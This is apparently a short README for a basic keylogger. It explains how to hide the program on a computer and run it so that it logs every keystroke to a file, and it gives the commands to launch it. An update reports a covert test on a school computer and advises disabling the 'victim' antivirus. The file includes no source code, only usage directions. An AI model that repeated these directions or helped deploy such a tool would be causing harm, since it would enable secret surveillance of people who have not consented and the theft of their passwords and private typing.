Very basic key logger.  
Just hide it somewhere on the computer and then run it. It will compure all key clicks in a log.txt file.  


You can run the python script to use it with: "python3 main.py".  
Or you could run the application/executable:  

```bash
cd KeyLogger  
cd dist/  
./main
```
Or just double click it i guess.


#### Update!!  

It doesn't work. Too basic.  
I tested it on a computer at my school, antivirus detects it, you need to turn of the victim antivirus hahah.
